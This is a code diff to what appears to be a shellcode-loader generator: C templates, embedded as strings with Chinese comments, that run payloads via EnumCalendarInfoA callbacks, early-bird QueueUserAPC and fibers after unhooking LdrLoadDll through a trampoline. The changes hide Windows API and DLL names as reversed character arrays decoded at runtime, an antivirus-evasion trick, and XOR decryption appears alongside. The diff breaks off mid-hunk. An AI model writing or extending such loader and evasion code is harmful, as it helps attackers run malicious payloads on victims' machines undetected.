@@ -89,7 +89,7 @@ var __c__words = `
 	unsigned char xpp[sizeof(name)];
 
     for (int sc_index = 0; sc_index < sizeof(xpp); sc_index++) {
-        for (int tt_index = 0; tt_index < sizeof(names); tt_index++)
+        for (int tt_index = 0; tt_index < 256; tt_index++)
         {
             if (names[tt_index] == name[sc_index]) {
                 xpp[sc_index] = tt_index;
@@ -213,6 +213,16 @@ int main() {
 // unhook模板
 // unhook加载方式
 var __c__unhook_callback = `
+	char enum_calendar_info[] = {   'A', 'o', 'f', 'n', 'I', 'r', 'a', 'd', 'n', 'e', 'l', 'a', 'C', 'm', 'u', 'n', 'E', '\0' };
+    reverseString(enum_calendar_info);
+    typedef BOOL(WINAPI* pEnumCalendarInfo)(
+            CALINFO_ENUMPROCA lpCalInfoEnumProc,
+            LCID Locale,
+            CALID Calendar,
+            CALTYPE CalType
+    );
+    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);
+
     DWORD oldProtect;
     addr = MyVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	isPrime(1000000000000002137);
@@ -224,6 +234,23 @@ var __c__unhook_callback = `
 	MyEnumCalendarInfoA((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
 `
 var __c__unhook__earlyBird = `
+	char queue_user_apc[] = { 'C', 'P', 'A', 'r', 'e', 's', 'U', 'e', 'u', 'e', 'u', 'Q', '\0'  };
+    reverseString(queue_user_apc);
+    typedef BOOL(WINAPI* pQueueUserAPC)(
+            PAPCFUNC pfnAPC,
+            HANDLE hThread,
+            ULONG_PTR dwData
+    );
+
+    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
+    char nt_test_alert[] = { 't', 'r', 'e', 'l', 'A', 't', 's', 'e', 'T', 't', 'N', '\0'};
+    reverseString(nt_test_alert);
+    typedef NTSTATUS(NTAPI* pNtTestAlert)(
+            VOID
+    );
+
+    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);
+
     DWORD oldProtect;
 	addr = MyVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	isPrime(1000000000000002137);
@@ -238,6 +265,33 @@ var __c__unhook__earlyBird = `
 
 // 纤程加载
 var __c__unhook__fiber = `
+	
+	char convert_thread_to_fiber[] = {  'r', 'e', 'b', 'i', 'F', 'o', 'T', 'd', 'a', 'e', 'r', 'T', 't', 'r', 'e', 'v', 'n', 'o', 'C', '\0' };
+    reverseString(convert_thread_to_fiber);
+    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
+            LPVOID lpParameter
+    );
+
+    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);
+
+    char create_fiber[] = { 'r', 'e', 'b', 'i', 'F', 'e', 't', 'a', 'e', 'r', 'C', '\0'};
+    reverseString(create_fiber);
+    typedef LPVOID(WINAPI* pCreateFiber)(
+            SIZE_T dwStackSize,
+            LPFIBER_START_ROUTINE lpStartAddress,
+            LPVOID lpParameter
+    );
+
+    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);
+
+    char switch_to_fiber[] = {  'r', 'e', 'b', 'i', 'F', 'o', 'T', 'h', 'c', 't', 'i', 'w', 'S', '\0'};
+    reverseString(switch_to_fiber);
+    typedef VOID(WINAPI* pSwitchToFiber)(
+            LPVOID lpFiber
+    );
+
+    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);
+
     DWORD oldProtect;
     PVOID mainFiber = MyConvertThreadToFiber(NULL);
     addr = MyVirtualAlloc(NULL, allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -348,6 +402,39 @@ _Bool isPrime(long long n) {
     return 1;
 }
 
+void reverseString(char* str) {
+    int left = 0;
+    int right = strlen(str) - 1;
+    char temp;
+
+    while (left < right) {
+        // 交换两个字符
+        temp = str[left];
+        str[left] = str[right];
+        str[right] = temp;
+
+        // 移动指针
+        left++;
+        right--;
+    }
+}
+
+void reverseWcharString(wchar_t* str) {
+    int left = 0;
+    int right = wcslen(str) - 1;
+
+    while (left < right) {
+        // 交换两个宽字符
+        wchar_t temp = str[left];
+        str[left] = str[right];
+        str[right] = temp;
+
+        // 移动指针
+        left++;
+        right--;
+    }
+}
+
 
 int main()
 {
@@ -360,14 +447,20 @@ int main()
     OBJECT_ATTRIBUTES objectAttributes_kernel32 = { 0 };
     OBJECT_ATTRIBUTES objectAttributes_ntdll = { 0 };
 
+    wchar_t user32_dll[] = { L'l', L'l', L'd', L'.', L'3', L'2', L'e', L's', L'U', L'\0' };
+    wchar_t kernel32_dll[]={ L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0' }  ;
+    wchar_t ntdll_dll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0' };
+    reverseWcharString(user32_dll);
+    reverseWcharString(kernel32_dll);
+    reverseWcharString(ntdll_dll);
 
-    wchar_t user32_dll[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'};
-    wchar_t kernel32_dll[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
-    wchar_t ntdll_dll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
+    char ldr_load_dll[] = { L'l', L'l', L'D', L'd', L'a', L'o', L'L', L'r', L'd', L'L', L'\0'};
+    char ntdll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0'};
+    char kernel32[] = { L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0'};
+    reverseString(ldr_load_dll);
+    reverseString(ntdll);
+    reverseString(kernel32);
 
-    char ldr_load_dll[] = { L'L', L'd', L'r', L'L', L'o', L'a', L'd', L'D', L'l', L'l', L'\0' };
-    char ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
-    char kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
 
     //Obtaining LdrLoadDll Address from loaded NTDLL
     RtlInitUnicodeString(&user32dll, user32_dll);
@@ -378,19 +471,22 @@ int main()
     InitializeObjectAttributes(&objectAttributes_user32, &user32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
     InitializeObjectAttributes(&objectAttributes_kernel32, &kernel32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
     InitializeObjectAttributes(&objectAttributes_ntdll, &ntdlldll, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    char get_module_handle_a[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', '\0' };
+    char get_module_handle_a[] = { 'A', 'e', 'l', 'd', 'n', 'a', 'H', 'e', 'l', 'u', 'd', 'o', 'M', 't', 'e', 'G', '\0' };
+    reverseString(get_module_handle_a);
     typedef HMODULE(WINAPI* pGetModuleHandleA1)(
             LPCSTR lpModuleName
     );
 
     pGetModuleHandleA1 MyGetModuleHandleA1 = (pGetModuleHandleA1)GetProcAddress((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)get_module_handle_a);
-    char get_proc_address[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' };
+    char get_proc_address[] = { 's', 's', 'e', 'r', 'd', 'd', 'A', 'c', 'o', 'r', 'P', 't', 'e', 'G', '\0'  };
+    reverseString(get_proc_address);
     typedef FARPROC(WINAPI* pGetProcAddress)(
             HMODULE hModule,
             LPCSTR lpProcName
     );
     pGetProcAddress MyGetProcAddress1 = (pGetProcAddress)GetProcAddress((HMODULE)MyGetModuleHandleA1(kernel32), (LPCSTR)get_proc_address);
-    char virtual_alloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
+    char virtual_alloc[] = { 'c', 'o', 'l', 'l', 'A', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0' };
+    reverseString(virtual_alloc);
     typedef LPVOID(WINAPI* pVirtualAlloc)(
             LPVOID lpAddress,
             SIZE_T dwSize,
@@ -399,7 +495,8 @@ int main()
     );
 
     pVirtualAlloc MyVirtualAlloc1 = (pVirtualAlloc)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)virtual_alloc);
-    char virtual_protect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
+    char virtual_protect[] = { 't', 'c', 'e', 't', 'o', 'r', 'P', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0'};
+    reverseString(virtual_protect);
     typedef BOOL(WINAPI* pVirtualProtect)(
             LPVOID lpAddress,
             SIZE_T dwSize,
@@ -430,84 +527,7 @@ int main()
     MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
     LdrLoadrDll = (pNewLdrLoadDll)trampoline;
 
-    //Loading dll
-    HANDLE User32module = NULL;
-    LdrLoadrDll(NULL, 0, &user32dll, &User32module);
-    HANDLE kernel32module = NULL;
-    LdrLoadrDll(NULL, 0, &kernel32dll, &kernel32module);
-    HANDLE ntdllmodule = NULL;
-    LdrLoadrDll(NULL, 0, &ntdlldll, &ntdllmodule);
-    typedef HMODULE(WINAPI* pGetModuleHandleA)(
-            LPCSTR lpModuleName
-    );
-    pGetProcAddress MyGetProcAddress = (pGetProcAddress)MyGetProcAddress1((HMODULE)kernel32module, (LPCSTR)get_proc_address);
-
-    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_alloc);
-
-    pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);
-
-
-    char write_process_memory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
-    typedef BOOL(WINAPI* pWriteProcessMemory)(
-            HANDLE hProcess,
-            LPVOID lpBaseAddress,
-            LPCVOID lpBuffer,
-            SIZE_T nSize,
-            SIZE_T* lpNumberOfBytesWritten
-    );
-
-    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
-    char convert_thread_to_fiber[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
-            LPVOID lpParameter
-    );
-
-    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);
-
-    char get_current_process[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
-    typedef HANDLE(WINAPI* pGetCurrentProcess)(void);
-
-    pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);
-
-    char create_fiber[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef LPVOID(WINAPI* pCreateFiber)(
-            SIZE_T dwStackSize,
-            LPFIBER_START_ROUTINE lpStartAddress,
-            LPVOID lpParameter
-    );
-
-    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);
-
-    char switch_to_fiber[] = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef VOID(WINAPI* pSwitchToFiber)(
-            LPVOID lpFiber
-    );
-
-    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);
-    char enum_calendar_info[] = { 'E', 'n', 'u', 'm', 'C', 'a', 'l', 'e', 'n', 'd', 'a', 'r', 'I', 'n', 'f', 'o', 'A','\0' };
-    typedef BOOL(WINAPI* pEnumCalendarInfo)(
-            CALINFO_ENUMPROCA lpCalInfoEnumProc,
-            LCID Locale,
-            CALID Calendar,
-            CALTYPE CalType
-    );
-    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);
-
-    char queue_user_apc[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0' };
-    typedef BOOL(WINAPI* pQueueUserAPC)(
-            PAPCFUNC pfnAPC,
-            HANDLE hThread,
-            ULONG_PTR dwData
-    );
-
-    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
-    char nt_test_alert[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
-    typedef NTSTATUS(NTAPI* pNtTestAlert)(
-            VOID
-    );
-
-    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);
-#else
+    #else
     //  x86 架构下的代码
 	LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
@@ -526,6 +546,9 @@ int main()
 	MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
 	LdrLoadrDll = (pNewLdrLoadDll)trampoline;
 
+
+#endif
+    ;
     //Loading dll
     HANDLE User32module = NULL;
     LdrLoadrDll(NULL, 0, &user32dll, &User32module);
@@ -543,7 +566,8 @@ int main()
     pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);
 
 
-    char write_process_memory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
+    char write_process_memory[] = { 'y', 'r', 'o', 'm', 'e', 'M', 's', 's', 'e', 'c', 'o', 'r', 'P', 'e', 't', 'i', 'r', 'W', '\0'};
+    reverseString(write_process_memory);
     typedef BOOL(WINAPI* pWriteProcessMemory)(
             HANDLE hProcess,
             LPVOID lpBaseAddress,
@@ -553,58 +577,11 @@ int main()
     );
 
     pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
-    char convert_thread_to_fiber[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
-            LPVOID lpParameter
-    );
-
-    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);
-
-    char get_current_process[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
+    
+    char get_current_process[] = { 's', 's', 'e', 'c', 'o', 'r', 'P', 't', 'n', 'e', 'r', 'r', 'u', 'C', 't', 'e', 'G', '\0' };
+    reverseString(get_current_process);
     typedef HANDLE(WINAPI* pGetCurrentProcess)(void);
-
     pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);
-
-    char create_fiber[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef LPVOID(WINAPI* pCreateFiber)(
-            SIZE_T dwStackSize,
-            LPFIBER_START_ROUTINE lpStartAddress,
-            LPVOID lpParameter
-    );
-
-    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);
-
-    char switch_to_fiber[] = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef VOID(WINAPI* pSwitchToFiber)(
-            LPVOID lpFiber
-    );
-
-    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);
-    char enum_calendar_info[] = { 'E', 'n', 'u', 'm', 'C', 'a', 'l', 'e', 'n', 'd', 'a', 'r', 'I', 'n', 'f', 'o', 'A','\0' };
-    typedef BOOL(WINAPI* pEnumCalendarInfo)(
-            CALINFO_ENUMPROCA lpCalInfoEnumProc,
-            LCID Locale,
-            CALID Calendar,
-            CALTYPE CalType
-    );
-    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);
-
-    char queue_user_apc[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0' };
-    typedef BOOL(WINAPI* pQueueUserAPC)(
-            PAPCFUNC pfnAPC,
-            HANDLE hThread,
-            ULONG_PTR dwData
-    );
-
-    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
-    char nt_test_alert[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
-    typedef NTSTATUS(NTAPI* pNtTestAlert)(
-            VOID
-    );
-
-    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);
-#endif
-    ;
 
 	REPLACR_OBFUSCATION
 
@@ -718,6 +695,39 @@ _Bool isPrime(long long n) {
     return 1;
 }
 
+void reverseString(char* str) {
+    int left = 0;
+    int right = strlen(str) - 1;
+    char temp;
+
+    while (left < right) {
+        // 交换两个字符
+        temp = str[left];
+        str[left] = str[right];
+        str[right] = temp;
+
+        // 移动指针
+        left++;
+        right--;
+    }
+}
+
+void reverseWcharString(wchar_t* str) {
+    int left = 0;
+    int right = wcslen(str) - 1;
+
+    while (left < right) {
+        // 交换两个宽字符
+        wchar_t temp = str[left];
+        str[left] = str[right];
+        str[right] = temp;
+
+        // 移动指针
+        left++;
+        right--;
+    }
+}
+
 void My_Xor(char* data, size_t data_len, char* key, size_t key_len) {
     int j;
     j = 0;
@@ -739,14 +749,20 @@ int main()
     OBJECT_ATTRIBUTES objectAttributes_kernel32 = { 0 };
     OBJECT_ATTRIBUTES objectAttributes_ntdll = { 0 };
 
+    wchar_t user32_dll[] = { L'l', L'l', L'd', L'.', L'3', L'2', L'e', L's', L'U', L'\0' };
+    wchar_t kernel32_dll[]={ L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0' }  ;
+    wchar_t ntdll_dll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0' };
+    reverseWcharString(user32_dll);
+    reverseWcharString(kernel32_dll);
+    reverseWcharString(ntdll_dll);
 
-    wchar_t user32_dll[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0'};
-    wchar_t kernel32_dll[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
-    wchar_t ntdll_dll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
+    char ldr_load_dll[] = { L'l', L'l', L'D', L'd', L'a', L'o', L'L', L'r', L'd', L'L', L'\0'};
+    char ntdll[] = { L'l', L'l', L'd', L'.', L'l', L'l', L'd', L't', L'n', L'\0'};
+    char kernel32[] = { L'l', L'l', L'd', L'.', L'2', L'3', L'l', L'e', L'n', L'r', L'e', L'K', L'\0'};
+    reverseString(ldr_load_dll);
+    reverseString(ntdll);
+    reverseString(kernel32);
 
-    char ldr_load_dll[] = { L'L', L'd', L'r', L'L', L'o', L'a', L'd', L'D', L'l', L'l', L'\0' };
-    char ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
-    char kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
 
     //Obtaining LdrLoadDll Address from loaded NTDLL
     RtlInitUnicodeString(&user32dll, user32_dll);
@@ -757,19 +773,22 @@ int main()
     InitializeObjectAttributes(&objectAttributes_user32, &user32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
     InitializeObjectAttributes(&objectAttributes_kernel32, &kernel32dll, OBJ_CASE_INSENSITIVE, NULL, NULL);
     InitializeObjectAttributes(&objectAttributes_ntdll, &ntdlldll, OBJ_CASE_INSENSITIVE, NULL, NULL);
-    char get_module_handle_a[] = { 'G', 'e', 't', 'M', 'o', 'd', 'u', 'l', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 'A', '\0' };
+    char get_module_handle_a[] = { 'A', 'e', 'l', 'd', 'n', 'a', 'H', 'e', 'l', 'u', 'd', 'o', 'M', 't', 'e', 'G', '\0' };
+    reverseString(get_module_handle_a);
     typedef HMODULE(WINAPI* pGetModuleHandleA1)(
             LPCSTR lpModuleName
     );
 
     pGetModuleHandleA1 MyGetModuleHandleA1 = (pGetModuleHandleA1)GetProcAddress((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)get_module_handle_a);
-    char get_proc_address[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', '\0' };
+    char get_proc_address[] = { 's', 's', 'e', 'r', 'd', 'd', 'A', 'c', 'o', 'r', 'P', 't', 'e', 'G', '\0'  };
+    reverseString(get_proc_address);
     typedef FARPROC(WINAPI* pGetProcAddress)(
             HMODULE hModule,
             LPCSTR lpProcName
     );
     pGetProcAddress MyGetProcAddress1 = (pGetProcAddress)GetProcAddress((HMODULE)MyGetModuleHandleA1(kernel32), (LPCSTR)get_proc_address);
-    char virtual_alloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', '\0' };
+    char virtual_alloc[] = { 'c', 'o', 'l', 'l', 'A', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0' };
+    reverseString(virtual_alloc);
     typedef LPVOID(WINAPI* pVirtualAlloc)(
             LPVOID lpAddress,
             SIZE_T dwSize,
@@ -778,7 +797,8 @@ int main()
     );
 
     pVirtualAlloc MyVirtualAlloc1 = (pVirtualAlloc)MyGetProcAddress1((HMODULE)GetModuleHandleA(kernel32), (LPCSTR)virtual_alloc);
-    char virtual_protect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0' };
+    char virtual_protect[] = { 't', 'c', 'e', 't', 'o', 'r', 'P', 'l', 'a', 'u', 't', 'r', 'i', 'V', '\0'};
+    reverseString(virtual_protect);
     typedef BOOL(WINAPI* pVirtualProtect)(
             LPVOID lpAddress,
             SIZE_T dwSize,
@@ -809,84 +829,7 @@ int main()
     MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
     LdrLoadrDll = (pNewLdrLoadDll)trampoline;
 
-    //Loading dll
-    HANDLE User32module = NULL;
-    LdrLoadrDll(NULL, 0, &user32dll, &User32module);
-    HANDLE kernel32module = NULL;
-    LdrLoadrDll(NULL, 0, &kernel32dll, &kernel32module);
-    HANDLE ntdllmodule = NULL;
-    LdrLoadrDll(NULL, 0, &ntdlldll, &ntdllmodule);
-    typedef HMODULE(WINAPI* pGetModuleHandleA)(
-            LPCSTR lpModuleName
-    );
-    pGetProcAddress MyGetProcAddress = (pGetProcAddress)MyGetProcAddress1((HMODULE)kernel32module, (LPCSTR)get_proc_address);
-
-    pVirtualAlloc MyVirtualAlloc = (pVirtualAlloc)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_alloc);
-
-    pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);
-
-
-    char write_process_memory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
-    typedef BOOL(WINAPI* pWriteProcessMemory)(
-            HANDLE hProcess,
-            LPVOID lpBaseAddress,
-            LPCVOID lpBuffer,
-            SIZE_T nSize,
-            SIZE_T* lpNumberOfBytesWritten
-    );
-
-    pWriteProcessMemory MyWriteProcessMemory = (pWriteProcessMemory)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)write_process_memory);
-    char convert_thread_to_fiber[] = { 'C', 'o', 'n', 'v', 'e', 'r', 't', 'T', 'h', 'r', 'e', 'a', 'd', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef LPVOID(WINAPI* pConvertThreadToFiber)(
-            LPVOID lpParameter
-    );
-
-    pConvertThreadToFiber MyConvertThreadToFiber = (pConvertThreadToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)convert_thread_to_fiber);
-
-    char get_current_process[] = { 'G', 'e', 't', 'C', 'u', 'r', 'r', 'e', 'n', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', '\0' };
-    typedef HANDLE(WINAPI* pGetCurrentProcess)(void);
-
-    pGetCurrentProcess MyGetCurrentProcess = (pGetCurrentProcess)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)get_current_process);
-
-    char create_fiber[] = { 'C', 'r', 'e', 'a', 't', 'e', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef LPVOID(WINAPI* pCreateFiber)(
-            SIZE_T dwStackSize,
-            LPFIBER_START_ROUTINE lpStartAddress,
-            LPVOID lpParameter
-    );
-
-    pCreateFiber MyCreateFiber = (pCreateFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)create_fiber);
-
-    char switch_to_fiber[] = { 'S', 'w', 'i', 't', 'c', 'h', 'T', 'o', 'F', 'i', 'b', 'e', 'r', '\0' };
-    typedef VOID(WINAPI* pSwitchToFiber)(
-            LPVOID lpFiber
-    );
-
-    pSwitchToFiber MySwitchToFiber = (pSwitchToFiber)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)switch_to_fiber);
-    char enum_calendar_info[] = { 'E', 'n', 'u', 'm', 'C', 'a', 'l', 'e', 'n', 'd', 'a', 'r', 'I', 'n', 'f', 'o', 'A','\0' };
-    typedef BOOL(WINAPI* pEnumCalendarInfo)(
-            CALINFO_ENUMPROCA lpCalInfoEnumProc,
-            LCID Locale,
-            CALID Calendar,
-            CALTYPE CalType
-    );
-    pEnumCalendarInfo MyEnumCalendarInfoA = (pEnumCalendarInfo)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)enum_calendar_info);
-
-    char queue_user_apc[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0' };
-    typedef BOOL(WINAPI* pQueueUserAPC)(
-            PAPCFUNC pfnAPC,
-            HANDLE hThread,
-            ULONG_PTR dwData
-    );
-
-    pQueueUserAPC MyQueueUserAPC = (pQueueUserAPC)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)queue_user_apc);
-    char nt_test_alert[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
-    typedef NTSTATUS(NTAPI* pNtTestAlert)(
-            VOID
-    );
-
-    pNtTestAlert MyNtTestAlert = (pNtTestAlert)GetProcAddress((HMODULE)ntdllmodule, (LPCSTR)nt_test_alert);
-#else
+    #else
     //  x86 架构下的代码
 	LPVOID trampoline = MyVirtualAlloc1(NULL, 19, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
 
@@ -905,6 +848,9 @@ int main()
 	MyVirtualProtect1(trampoline, 30, PAGE_EXECUTE_READ, &oldProtect1);
 	LdrLoadrDll = (pNewLdrLoadDll)trampoline;
 
+
+#endif
+    ;
     //Loading dll
     HANDLE User32module = NULL;
     LdrLoadrDll(NULL, 0, &user32dll, &User32module);
@@ -921,7 +867,9 @@ int main()
 
     pVirtualProtect MyVirtualProtect = (pVirtualProtect)MyGetProcAddress((HMODULE)kernel32module, (LPCSTR)virtual_protect);
 
-    char write_process_memory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0' };
+
+    char write_process_memory[] = { 'y', 'r', 'o', 'm', 'e', 'M', 's', 's', 'e', 'c', 'o', 'r', 'P', 'e', 't', 'i', 'r', 'W', '\0'};
+    reverseString(write_process_memory);
     typedef BOOL(WINAPI* pWriteProcessMemory)(
             HANDLE hProcess,
             LPVOID lpBaseAddress,
@@ -931,58 +879,11 @@ int main()
     );
 
